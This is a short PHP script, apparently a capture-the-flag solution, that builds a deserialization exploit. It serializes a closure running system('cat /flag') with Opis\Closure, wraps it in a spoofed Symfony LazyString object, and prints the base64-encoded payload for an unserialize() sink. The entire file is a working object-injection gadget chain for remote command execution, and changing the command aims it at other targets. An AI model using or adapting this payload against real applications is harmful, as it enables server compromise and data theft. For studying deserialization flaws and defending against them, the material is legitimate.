<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace {
    include_once "vendor/autoload.php";
    $func = function() {system("cat /flag");};
    $raw = \Opis\Closure\serialize($func);
    $data = unserialize($raw);
    $exp = new \Symfony\Component\String\LazyString($data);

    var_dump(base64_encode(serialize($exp)));
}